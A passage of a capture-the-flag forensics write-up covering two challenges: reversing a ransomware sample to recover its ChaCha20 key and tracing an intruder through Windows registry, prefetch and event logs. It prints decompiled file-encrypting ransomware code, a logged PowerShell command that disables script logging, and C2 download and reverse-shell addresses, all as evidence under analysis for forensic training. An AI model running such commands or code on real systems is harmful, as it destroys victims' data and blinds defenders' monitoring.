  v72 = ((((v24 + qword_1400120B0) << 8) & 0xFF00FF00FF00FF00ui64 ^ (v24 + qword_1400120B0)) >> 8) & 0xFF00FF00FF00FFi64 ^ ((v24 + qword_1400120B0) << 8) & 0xFF00FF00FF00FF00ui64 ^ (v24 + qword_1400120B0);
  v73 = __ROR8__(v72, 7);
  v74 = __ROL8__(v72, 13);
  v75 = 0xC2B2AE3D27D4EB4Fui64
      * (((0x9E3779B97F4A7C15ui64 * (v73 ^ v74 ^ v72)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v73 ^ v74 ^ v72)));
  result = HIDWORD(v75) ^ v75;
  *(_QWORD *)&xmmword_1400120E0 = HIDWORD(v62) ^ v62;
  *((_QWORD *)&xmmword_1400120E0 + 1) = HIDWORD(v66) ^ v66;
  *(_QWORD *)&xmmword_1400120F0 = HIDWORD(v71) ^ v71;
  *((_QWORD *)&xmmword_1400120F0 + 1) = result;
  return result;
}
```

Now jumping to the Xref to where it was used, we can see it’s used in ChaCha20 encryption.

![image](https://hackmd.io/_uploads/HyweipNL-e.png)

```cpp
__int64 __fastcall sub_1400022F0(const CHAR *a1)
{
  __int64 result; // rax
  void *v2; // rsi
  DWORD v3; // r15d
  char *v4; // rax
  char *v5; // rdx
  unsigned int v6; // [rsp+54h] [rbp-144h]
  DWORD NumberOfBytesRead; // [rsp+68h] [rbp-130h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+6Ch] [rbp-12Ch] BYREF
  char v9[32]; // [rsp+70h] [rbp-128h] BYREF
  __int64 v10[2]; // [rsp+90h] [rbp-108h] BYREF
  __m128i v11; // [rsp+A0h] [rbp-F8h]
  __m128i v12; // [rsp+B0h] [rbp-E8h]
  __int64 v13; // [rsp+C0h] [rbp-D8h]
  __int64 v14; // [rsp+C8h] [rbp-D0h]
  char Buffer[64]; // [rsp+D0h] [rbp-C8h] BYREF
  char v16[136]; // [rsp+110h] [rbp-88h] BYREF

  v6 = sub_140002210(a1, v9);
  result = (__int64)CreateFileA(a1, 0xC0000000, 0, 0i64, 3u, 0, 0i64);
  v2 = (void *)result;
  if ( result != -1 )
  {
    qmemcpy(v10, "expand 32-byte k", sizeof(v10));
    v13 = 0i64;
    v14 = 0i64;
    v11 = _mm_loadu_si128((const __m128i *)&xmmword_1400120E0);
    v12 = _mm_loadu_si128((const __m128i *)&xmmword_1400120F0);
    while ( ReadFile(v2, Buffer, 0x40u, &NumberOfBytesRead, 0i64) )
    {
      v3 = NumberOfBytesRead;
      if ( !NumberOfBytesRead )
        break;
      sub_140001F50(v16, v10);
      v4 = Buffer;
      v5 = v16;
      do
        *v4++ ^= *v5++;
      while ( &Buffer[v3] != v4 );
      SetFilePointer(v2, -v3, 0i64, 1u);
      WriteFile(v2, Buffer, NumberOfBytesRead, &NumberOfBytesWritten, 0i64);
      LODWORD(v13) = v13 + 1;
    }
    CloseHandle(v2);
    result = v6;
    if ( v6 )
      return sub_140002280(a1, v9);
  }
  return result;
}
```

And by going through the rest of the ransomware, it sends the data found to certain paths to a certain **203.0.113.42**, then it encrypts them.

Now, to get the key, we can do dynamic analysis while skipping all the checks and setting the IP to the beginning of the function responsible for driving the key, then letting it run to the end to easily get the key

![image](https://hackmd.io/_uploads/ryLLOpEUZl.png)

![image](https://hackmd.io/_uploads/Skl9d648-x.png)

**Method 2**


The ChaCha20 key is NOT hardcoded - it's derived at runtime through a multi-phase KDF.

**Key Initialization Function (0x14000AAC0):**
- Reads 120 bytes from `.rdata+0x100` (VA 0x14000E100)
- XORs each byte with `0xA5` to decode
- Stores as 15 QWORDs in .bss at `0x140012060`

The decoded QWORDs are well-known "nothing up my sleeve" constants:
- `0xC0FFEE123456789B` (C0FFEE + test pattern)
- `0x9E3779B97F4A7C15` (golden ratio)
- `0x243F6A8885A308D3` (fractional part of pi)
- `0x6A09E667F3BCC909` (sqrt(2))
- `0xDEADBEEFCAFEBABE`
- `0x0123456789ABCDEF`
- etc.

**Key Derivation Function (0x1400016C0):**
- **Phase 1:** 15-iteration loop using FNV-1a (offset basis `0xCBF29CE484222325`, prime `0x100000001B3`) and xxHash64 constants
- **Phase 2:** Finalization with additional mixing using xxHash PRIME64_2 (`0xFF51AFD7ED558CCD`)
- **Phase 3:** 600,000 iterations (`cmp ebp, 0x927C0`) of further mixing with ROL/ROR/SHR/IMUL operations
- **Output:** 4 QWORDs (32 bytes) written to `0x1400120E0` in .bss

**Extracting the key with Unicorn emulation:**

```python
from unicorn import *
from unicorn.x86_const import *
import struct

with open('setup.exe', 'rb') as f:
    binary = f.read()

mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(0x140000000, 0x20000)

# Load sections
mu.mem_write(0x140001000, binary[0x400:0x400+0x9E00])   # .text
mu.mem_write(0x14000B000, binary[0xA200:0xA200+0x2400]) # .data
mu.mem_write(0x14000E000, binary[0xC600:0xC600+0x1400]) # .rdata

# Initialize key material (what 0x14000AAC0 does)
rdata_bytes = binary[0xC700:0xC700+120]
decoded = bytes(b ^ 0xA5 for b in rdata_bytes)
mu.mem_write(0x140012060, decoded)
mu.mem_write(0x140012040, struct.pack('<I', 1))

# Set up stack
mu.mem_map(0x7FFF0000, 0x100000)
rsp = 0x7FFF0000 + 0x100000 - 0x1000
RETURN_ADDR = 0x1400DEAD0
mu.mem_map(0x1400D0000, 0x10000)
mu.mem_write(RETURN_ADDR, b'\xcc')
mu.mem_write(rsp - 8, struct.pack('<Q', RETURN_ADDR))
mu.reg_write(UC_X86_REG_RSP, rsp - 8)

# Run KDF
mu.emu_start(0x1400016C0, RETURN_ADDR, timeout=60*1000000)

# Read 32-byte key from 0x1400120E0
key = bytes(mu.mem_read(0x1400120E0, 32))
print(f"Key: {key.hex()}")
```

![image](https://hackmd.io/_uploads/HyVMBhrL-e.png)


At the end, it creates the **README_K31R.txt** file 

![image](https://hackmd.io/_uploads/B1oFpTN8-g.png)

```cpp
int __fastcall sub_1400024D0(const char *a1)
{
  __int64 v1; // rax
  __int64 i; // rax
  HANDLE FileA; // rax
  void *v4; // rbx
  DWORD v5; // eax
  DWORD NumberOfBytesWritten; // [rsp+4Ch] [rbp-46Ch] BYREF
  char v8[32]; // [rsp+50h] [rbp-468h] BYREF
  char Str[256]; // [rsp+70h] [rbp-448h] BYREF
  char v10[264]; // [rsp+170h] [rbp-348h] BYREF
  char v11[264]; // [rsp+280h] [rbp-238h] BYREF
  CHAR FileName[296]; // [rsp+390h] [rbp-128h] BYREF

  v1 = 1i64;
  qmemcpy(v10, &unk_14000B000, sizeof(v10));
  qmemcpy(v11, &unk_14000B120, sizeof(v11));
  qmemcpy(FileName, v10, 0x108ui64);
  do
  {
    v8[v1 - 1] = FileName[v1] ^ 0x11;
    ++v1;
  }
  while ( v1 != 16 );
  v8[15] = 0;
  qmemcpy(FileName, v11, 0x108ui64);
  for ( i = 0i64; i != 100; i += 4i64 )
    *(_DWORD *)&Str[i] = *(_DWORD *)&FileName[i + 1] ^ 0x22222222;
  Str[100] = 0;
  wsprintfA(FileName, "%s\\%s", a1, v8);
  FileA = CreateFileA(FileName, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
  v4 = FileA;
  if ( FileA != (HANDLE)-1i64 )
  {
    v5 = strlen(Str);
    WriteFile(v4, Str, v5, &NumberOfBytesWritten, 0i64);
    LODWORD(FileA) = CloseHandle(v4);
  }
  return (int)FileA;
}
```

And this note for us:
"*All your files are encrypted by K1r1too! To restore, contact him at https://medium.com/@karimesam117*"

![image](https://hackmd.io/_uploads/ByUDwMHIWe.png)


So we now have the encryption key

`cc2e406c5a9cf1202256672389781d0ebecbf73bbc091b035f88a41b90b7b07f`

But still, we don’t know the name of the victim, so maybe he got the orders from someone bigger and didn’t act on his own. So we now need to find a line of communication between this tarok and other guy who gave him the target.

Going back to the host, we can see that he has Discord and Telegram installed and used by him before.

But if we explore the [Discord cache](https://abrignoni.blogspot.com/2018/03/finding-discord-app-chats-in-windows.html) ***C:\Users\tarok\AppData\Roaming\discord\cache\Cache_Data*** using ChromeCacheView, we won’t find anything.

![image](https://hackmd.io/_uploads/BJStSxHUZe.png)


But we know that Telegram can use Windows notifications, so what if the message is no longer there, but still wasn’t removed from the notifications database

So after we check the database ***C:\Users\tarok\AppData\local\Microsoft\Windows\Notifications\wpndatabase.db***

![image](https://hackmd.io/_uploads/rJSrrlrIWl.png)


we can see that a message was sent from **Tarek Ibrahim** to the attacker telling him that the next target is **Purdue Pete**.

![image](https://hackmd.io/_uploads/S1aELxr8-e.png)

> Flag: 0xL4ugh{Purdue Pete;cc2e406c5a9cf1202256672389781d0ebecbf73bbc091b035f88a41b90b7b07f}


## The Hood

![image](https://hackmd.io/_uploads/r1Mzz1LI-e.png)


*Teddy MacDonald, a senior CIA operative, is under investigation after classified files leaked from his personal computer. A security camera captured an unidentified individual breaking into Teddy’s residence and tampering with his workstation.
Your mission is to analyze the evidence and uncover the truth—was this a targeted intrusion, or is there more to the story? Using your investigative skills, help the team piece togr the events.*
[*Link Chall*](https://mega.nz/file/M28QRKYZ#xx6AB-vkXJrJKYUDbWt0HAgkkNtJTs_It974BVBjUHo)


In this challenge the attacker access the computer physically.

### Q1: The intruder connected a device to Teddy’s machine during the breach. Can you uncover its serial number?

Parsed the **SYSTEM** registry hive at `C:\Windows\System32\config\SYSTEM` 
![image](https://hackmd.io/_uploads/H1DuXjHUbx.png)

Load in Registry Explorer. Find follow path: `ROOT -> ControlSet001 -> Enum -> USBSTOR`
![image](https://hackmd.io/_uploads/SJUdViHLWe.png)

Can se the serial number **UM2I126E**

### Q2: What is the manufacturer of this device? [company name]

Look the device name we can see the company name
![image](https://hackmd.io/_uploads/SyXrrsSLWx.png)

answer **Transcend**


### Q3: What is the friendly name that, the intruder assigned to this device?

we will move to the second hive **SOFTWARE**. Load in Registry Explorer, and in the key ***windows protable devices*** or ***MountedDevices*** we can see the friendly name

Find follow path: `Microsoft -> Windows Portable Devices`
![image](https://hackmd.io/_uploads/HyPiLiHLZx.png)

answer: **OMKALALA**

### Q4: After the guy walked in, we need to know how much time he used Teddy’s machine for?

We need to compine the investigation from multiple artifacts to find the answer. Follow path `C\Windows\System32\winevt\Logs\` & open file 
***Security.evtx*** with Event Viewer

Logon to user **a1l4m** before this was in `2024-12-10 21:59:52`
![image](https://hackmd.io/_uploads/S1R6c6rLWe.png)


Logoff was in `2024-12-10 22:05:45`.
![image](https://hackmd.io/_uploads/HkIvqaSU-e.png)

answer: `2024-12-10 21:59:52_2024-12-10 22:05:45`

### Q5: During their brief stay, the attacker appeared to be scouting the system. Which application did they use for reconnaissance?

Between `21:59:52 - 22:05:45`, attacker activated a built-in Windows tool to view running processes/services. We need to find out what that tool was.

Follow path: `C\Windows\Prefetch`
![image](https://hackmd.io/_uploads/ryxia6rLWl.png)

The first useful app that run after the logon was `taskmgr.exe`

*Task Manager (taskmgr.exe) is a task management tool. Attackers launch it to spy on (recon) what services are running on the computer, thereby finding vulnerabilities to exploit.*

### Q6: In the reconnaissance stage the attacker found a vulnerable service on the machine. What is the CVE number assigned to this vulnerability?

By examining Task Manager, the attacker discovered a lucrative printer service. Look at the file list in the Prefetch folder; there's a series of files starting with **DXP01...**
![image](https://hackmd.io/_uploads/rkckkASLZl.png)

When i search wwith keyword filename, i know this is malware **XPS Card Printer**
![image](https://hackmd.io/_uploads/SyqQkRSU-g.png)

I found CVE Id
![image](https://hackmd.io/_uploads/S1FqJCSLbe.png)

answer: **CVE-2024-34329**

*the cve uses sideloading technique(replace the legitimate dll with a malicious dll in the same path, when the executable run it will load the dll and the maliciouse code will run)*


### Q7: What is the SHA1 hash of the file that he used to exploit the service?

It is just the hash of the dll. Follow path: `C\ProgramData\Datacard\XPS Card Printer\Service\`
![image](https://hackmd.io/_uploads/HyKTx0HLbx.png)


answer: **7ba477a58eb546b6d3cac3a86633b531ba82fa50**


### Q8; What MITRE technique is used by the attacker here?

Dll Side loading
![image](https://hackmd.io/_uploads/rydZZ0H8Wl.png)

 -> **T1574.002**


### Q9: To cover their tracks, the attacker executed multiple commands to disable system logging. What is the name of the file that has these commands?

The first thing that came to my mind at that moment was that the commands should be in a PowerShell script, so I went to the powershell logs: ***Microsoft-Windows-PowerShell%4Operational.evtx***
![image](https://hackmd.io/_uploads/r1rBf0r8-l.png)

```log
<Data Name="MessageNumber">1</Data> 
  <Data Name="MessageTotal">1</Data> 
  <Data Name="ScriptBlockText">powershell.exe -ExecutionPolicy ByPass -Command New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force;powershell.exe -ExecutionPolicy ByPass -Command New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force;powershell.exe -ExecutionPolicy ByPass -Command Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force;powershell.exe -ExecutionPolicy ByPass -Command Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force;</Data> 
  <Data Name="ScriptBlockId">d03ef7cb-dedb-4ff6-a3db-72c3415323a7</Data> 
  <Data Name="Path">C:\Windows\TEMP\svc1D3C.ps1</Data>
```
This script is located in the `C:\Windows\TEMP\`
folder. Execute the Set-ItemProperty command to set the **EnableScriptBlockLogging** value to 0 (Disable logging).

answer: **svc1D3C.ps1**

### Q10: To establish persistence, The intruder downloaded additional payloads. What is the IP and Port of the storage C2 server? Format IP:Port

Follow path: **`C\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData`**
Open file with notepad first, i found IP in file **965B295F92685B983726E076B583D923**
![image](https://hackmd.io/_uploads/B1vSVArLWx.png)

we see the URL: http://3.75.217.26/tools.7z
*Certutil (the tool you just checked the cache of) downloads files via port 80. But the original malware (DEVOBJ.dll) is actually configured to connect to port 8080 to retrieve the initial payloads (like the .ps1 script file you found earlier).*

Therefore, answer: **3.75.217.26:8080**

### Q11: The attacker established a shell connection to a remote server. Your job: pinpoint the exact time the connection started. Format YYYY-MM-DD HH:MM:SS

Back path: `C\Windows\System32\winevt\Logs\`. Open file ***Key Management Service.evtx***

![image](https://hackmd.io/_uploads/H1O1IArIZe.png)

answer: **2024-12-11 04:01:41**

### Q12: Which IP address and port were used by the attacker to establish the shell and communicate with the C2 server? Foramt IP:port

The data in the <Binary> tag of Event 31337 is the encrypted shellcode.
![image](https://hackmd.io/_uploads/HkPKLAr8Wg.png)

Look at the first 3 bytes of the hexadecimal string: `1F 8B 08`. In computer science, **1F 8B** is the classic signature (magic bytes) of the **GZIP** compression format. This means that the attacker compressed the malicious code using Gzip first and then XOR it [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')Gunzip()XOR(%7B'option':'Hex','string':'5A'%7D,'Standard',false)To_Hex('Space',0)&input=MUY4QjA4MDAwMDAwMDAwMDA0MDA1QjI2NzQ3M0RGQUE0REIzQTJBMkEyQTRCOUE1QjkzOEI4Nzk4NEIyM0JFQzg1MkU3MjU4MDFCMTEzMTA1NzA5NURENEUwMTIwQTdEMkIyMDIwOUUzRDU5Mjg3QkQ2QjczNDZCQjU4OEIyMkFFOUQ5OTNDM0E1QTM2N0VGRDhDRTIxQ0QwRDUyNzU1MTIyNEQyOEJBRUJFMkFENEI0MDgzODRFRUNGRDJCMzA1RjJCODJFMEEzOUM5NUQ5NEFBMTI4RUVFREFDOTIzQjQ3NEIyRjRDNUJDNEI0MkQxM0Q1MDczQTAyNjI0RUREMjVGMkQxNjI5NTYxNzI0OUZEQ0FEREZDNDA0NTQ1RjA3NTQ2RjIzN0QzMTRDMDhDODc2MDNCMkE1MkZDNjAxQjU3NTQ5MzM0OTMzQjEzMDMzMDAyOTY2NjkwNkExOUJEQkFBQTQzOTk2RUUwMjcyMTg4NDJFN0E2Q0U2NURCQTc0MjlCQkYwMTM1RENEMENENkNDMENBMDU3Nzg4NDJGRUYxMUJBQkRFRDU3NzQ1NDk0RjBFNUZEQzJDRjIyQTI3QTEzMjM5NUU3Mjk0OEYzMDk1RkRFMjc3Njc5QjVGNDAzMzFERDlBRDhBNUZENjI5NzM3MTg0NTAzMTUzMTRCM0YyOEJFNjUxOEI1QjQ5RjhCMEJFODNDRjFFQzU5NDI0QjY3MDk1RDlFMDEyNjY3NEIzRkQ4MTBEQUJBNkI2OUJGRDBFNUI5MDY1RUQyNEM2Mjk3NzcwODVENUUyQ0ZERTBGMDdGM0Q2QkEwRTBFRDc5NTIxMTQwNUIxRTU5OUFEQjQ1ODE4MDM0OTczNDk3RDBFNTFEQkNCQ0JDNDA2MzBDQzI5OUE1Qjk3NjJDQjM5OTJCNTdDNzE3MUQyRDc0NURBRUNFNjk0RTk0OTFEMEU1M0QzQzVDRDI2MDI4QkM3NDE2ODg5ODI0N0U3OUI2MThDODI2RTU2OUE5Nzc4MDg2NjY3NzA4MkQ5RDcwMzE0NEZBNDFEMDVENzdBQkE1RkQwRjU3QkRGRkMxMjNGREUwQ0ZGOUU3Qzc4MTkyMzdFNzE1QTVDNUE4MDVEQzVBQjg0QjNGRkVBMUFDQTc4NkE5MDFEMEZEOTcxQjk2RjYwMzAwREQzQjY4QTdDQzAxMDAwMA&ienc=65001&oeol=CR)

![image](https://hackmd.io/_uploads/rk9KcRBLbe.png)
![image](https://hackmd.io/_uploads/HyBgsABLWl.png)

answer: **3.121.196.122:55099**


### Q13: To ensure control over the system, The attacker runs some commands on the machine. What command did he use to enumerate the machine and ensure access?

back to **prefetch**, we can see **whoami.exe** (*WHOAMI.EXE-9D378AFE.pf*) executed after the **cmd.exe**
![image](https://hackmd.io/_uploads/ry0X2RSL-l.png)

answer: **whoami**


### Q14: Before leaving, the attacker downloaded additional files for exfiltration. Can you uncover the SHA256 hash of the downloaded file? Hint: it’s a zip file

The attacker downloaded the **tools.7z** file to their computer (we found in Q10). Back path:  `C\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\`
![image](https://hackmd.io/_uploads/B1rnnRSLZg.png)
![image](https://hackmd.io/_uploads/rJdbp0rUWg.png)

answer: **0905089bb59887880312af06c769cebd967ffa7d2f652fe397ee972ddbed3d25**


### Q15: When did the attacker execute the file used for exfiltration last time? Format YYYY-MM-DD HH:MM:SS

Extracted the zip file we will see file called deep **inside.zip** and I tried to reverse it to confirm if it used for exfiltration or not.

This file was searching for files with extensions **.txt** or **.png** in the Desktop and Downloads then comprise them to one file Exfiltrated_data.zip then rename it to **Would you lose.png** and it used **sdelete.exe** to remove the files.
![image](https://hackmd.io/_uploads/rJRnA0HLWg.png)
![image](https://hackmd.io/_uploads/B1rpR0HL-g.png)
![image](https://hackmd.io/_uploads/S1jaA0SLWl.png)

so we confirmed the exfiltration, now we need to go back to prefetch files.
![image](https://hackmd.io/_uploads/B1xZkyLUZl.png)

answer: **2024-12-11 04:42:35** (UTC conversion: 11:42 - 7h = 04:42)

### Q16: Before exfiltrating the attacker zipped some files for easy exfiltration. What was the final combined file they exfiltrated?

answer: **Would you lose.png**

### Q17: What treasure trove of files did the attacker manage to steal? Provide a complete list of the exfiltrated files. provide them in alphabetical order. Example (file1.ext-file2.ext- etc..)

we’re going back to the prefetch files, to see the files that accessed by the malware
    
```
35: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DOWNLOADS\IMPORTANT.TXT
36: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\APPDATA\LOCAL\TEMP\EXFILTRATED_DATA.ZIP (Keyword: True)
37: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DOWNLOADS\MEETINGS.TXT
38: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DOWNLOADS\REMINDERS.TXT
39: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DOWNLOADS\RESEARCH.TXT
40: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DOWNLOADS\STAND_PROUD_YOU_ARE_STRONG.PNG
41: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DOWNLOADS\TASKS.TXT
42: \VOLUME{01db3162ca695d7e-96ca730a}\USERS\A1L4M\DESKTOP\TODOLIST.TXT
```
    
We need the .txt and .png files from the desktop and downloads just.

answer: **IMPORTANT.TXT-MEETINGS.TXT-REMINDERS.TXT-RESEARCH.TXT-STAND_PROUD_YOU_ARE_STRONG.PNG-TASKS.TXT-TODOLIST.TXT**
  
![image](https://hackmd.io/_uploads/rkZVWkLIWe.png)

> Flag: 0xL4ugh{97913f33aac650abb1c799e5b7e9041a} 

